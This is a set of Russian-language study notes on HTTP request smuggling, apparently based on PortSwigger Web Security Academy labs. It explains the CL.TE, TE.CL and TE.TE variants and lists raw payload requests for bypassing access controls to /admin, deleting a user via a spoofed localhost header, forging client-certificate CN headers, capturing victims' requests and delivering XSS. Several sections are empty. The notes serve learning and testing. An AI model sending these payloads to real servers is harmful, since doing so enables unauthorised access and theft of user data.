### **Http_request_smuggling**
* **Описание**
Контрабанда HTTP-запросов — это метод вмешательства в процесс обработки веб-сайтом последовательностей HTTP-запросов, полученных от одного или нескольких пользователей. Уязвимости контрабанды запросов часто имеют критический характер, позволяя злоумышленнику обходить средства безопасности, получать несанкционированный доступ к конфиденциальным данным и напрямую скомпрометировать других пользователей приложения.

* **Как возникают уязвимости**
Современные веб-приложения часто используют цепочки HTTP-серверов между пользователями и конечной логикой приложения. Пользователи отправляют запросы на сервер front-end (иногда называемый балансировщиком нагрузки или обратным прокси-сервером), а этот сервер пересылает запросы на один или несколько серверов back-end. Этот тип архитектуры становится все более распространенным, а в некоторых случаях и неизбежным в современных облачных приложениях.
Большинство уязвимостей контрабанды HTTP-запросов возникают из-за того, что спецификация HTTP/1 предоставляет два разных способа указать, где заканчивается запрос: заголовок Content-Length и заголовок Transfer-Encoding.

* **Виды**
1. Классические
Эти методы возможны только с использованием HTTP/1-запросов. При тестировании сайтов с поддержкой HTTP/2 вам необходимо вручную переключать протоколы в Burp Repeater.
Включают размещение заголовков Content-Length и Transfer-Encoding в одном HTTP/1-запросе и манипулирование ими таким образом, чтобы front-end и back-end-серверы обрабатывали запрос по-разному. Точный способ, которым это делается, зависит от поведения двух серверов:
+ CL.TE: front-end-сервер использует заголовок Content-Length, а back-end-сервер использует заголовок Transfer-Encoding.
Transfer-Encoding: chunked
0
G
+ TE.CL: front-end-сервер использует заголовок Transfer-Encoding, а back-end-сервер использует заголовок Content-Length.
Сначала нужно будет перейти в меню Repeater и убедиться, что опция «Обновить длину содержимого» не отмечена.
Нужно включить завершающую последовательность \r\n\r\n после последнего 0.
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
+ TE.TE: front-end- и back-end-серверы поддерживают заголовок Transfer-Encoding, но один из серверов можно заставить не обрабатывать его, запутав заголовок каким-либо образом.
Здесь и фронтенд, и бэкенд-серверы поддерживают заголовок Transfer-Encoding, но один из серверов можно заставить не обрабатывать его, каким-либо образом обфускировав заголовок.
Существует потенциально бесконечное количество способов обфускации заголовка Transfer-Encoding. Например:
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
2. подмены HTTP-запросов для обхода элементов управления безопасностью на стороне клиента
предположим, что приложение использует сервер на стороне клиента для реализации ограничений контроля доступа, пересылая запросы только в том случае, если пользователь имеет право доступа к запрошенному URL-адресу. Затем внутренний сервер принимает каждый запрос без дальнейшей проверки. В этой ситуации уязвимость подмены HTTP-запросов может быть использована для обхода элементов управления доступом путем подмены запроса на ограниченный URL-адрес.
3. Перезаписи запросов front-end
еобходимо выполнить следующие шаги:
* Найти запрос POST, который отражает значение параметра запроса в ответе приложения.
* Перетасовать параметры так, чтобы отраженный параметр оказался последним в теле сообщения.
* Передать этот запрос контрабандой на сервер back-end, а затем сразу обычный запрос, переписанную форму которого вы хотите раскрыть.
4. Обход аутентификации клиента
Некоторые сайты идут на шаг дальше и реализуют форму взаимной аутентификации TLS, где клиенты также должны предоставить сертификат серверу. В этом случае CN клиента часто является именем пользователя или чем-то подобным, что может использоваться в логике внутреннего приложения как часть механизма контроля доступа, например.
Компонент, который аутентифицирует клиента, обычно передает соответствующие данные из сертификата в приложение или внутренний сервер через один или несколько нестандартных заголовков HTTP. Например, фронтенд-серверы иногда добавляют заголовок, содержащий CN клиента, к любым входящим запросам:
GET /admin HTTP/1.1
Хост: normal-website.com
X-SSL-CLIENT-CN: carlos
5. Захват запросов других пользователей
Подходящими функциями для использования в качестве средства для этой атаки будут комментарии(перетасуйте параметры тела так, чтобы параметр comment оказался последним, и убедитесь, что он все еще работает), электронные письма, описания профилей, имена экранов и т. д.
Вы перешлете эквивалентный запрос с слишком длинным заголовком Content-Length и параметром комментария, расположенным в конец запроса, тело будет длиной 400 байт, но мы отправили только 144 байта. В этом случае внутренний сервер будет ждать оставшиеся 256 байт, прежде чем выдать ответ, или же выдаст тайм-аут, если он не придет достаточно быстро. В результате, когда другой запрос отправляется на внутренний сервер по тому же соединению, первые 256 байт фактически добавляются к контрабандному запросу
Чтобы захватить больше запроса жертвы, вам просто нужно соответственно увеличить значение заголовка Content-Length контрабандного запроса, но учтите, что это потребует определенного количества проб и ошибок. Если вы столкнетесь с тайм-аутом, это, вероятно, означает, что указанный вами Content-Length больше фактической длины запроса жертвы. В этом случае просто уменьшите значение, пока атака не сработает снова.
Захватывает данные только до разделителя параметров, который применим к контрабандному запросу. Для отправленных форм с кодировкой URL это будет символ &, что означает, что содержимое, сохраненное из запроса пользователя-жертвы, будет заканчиваться на первом &, который может даже появиться в строке запроса.
6. Использование контрабанды HTTP-запросов для эксплуатации отраженного XSS
Его можно использовать для эксплуатации поведения XSS в частях запроса, которые нельзя тривиально контролировать в обычной атаке отраженного XSS, например, в заголовках HTTP-запросов.
Например, предположим, что приложение имеет отраженную уязвимость XSS в заголовке User-Agent. Вы можете использовать это в атаке контрафактного запроса следующим образом:
POST / HTTP/1.1
Host: affected-website.com
Content-Length: 63
Transfer-Encoding: chunked
0
GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
7. Использование контрафактного HTTP-запроса для превращения внутреннего перенаправления в открытое перенаправление
Многие приложения выполняют внутренние перенаправления с одного URL на другой и помещают имя хоста из заголовка Host запроса в URL перенаправления. Примером этого является поведение по умолчанию веб-серверов Apache и IIS, где запрос на папку без завершающего слеша получает перенаправление в ту же папку, включая завершающий слеш:
GET /home HTTP/1.1
Host: normal-website.com
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
8. Использование контрабанды HTTP-запросов для выполнения атаки отравления веб-кэша
9. 
10. Понижение версии HTTP/2

* **POC**
1. 	С использованием методов синхронизации
* CL.TE:
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
* TE.CL
Transfer-Encoding: chunked
Content-Length: 6

0

X\r\n
2.	С использованием дифференциальных ответов
* CL.TE
Включает отправку двух запросов приложению в быстрой последовательности:
Запрос «атаки», который предназначен для вмешательства в обработку следующего запроса.-->«Обычный» запрос.
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
* TE.CL
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

3. 	Использование подмены HTTP-запросов для обхода элементов управления безопасностью на стороне клиента
+ CL.TE
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
+ TE.CL
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
4. Выявление перезаписи запросов front-end
POST / HTTP/1.1
Host: 0ab3004f034bd37182a633510074000e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

POST /admin/delete?username=carlos HTTP/1.1
X-SgfOsS-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Connection: close

x=
5. Обход аутентификации клиента
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x

----------------Профит
----------------Защита
----------------Обход защиты
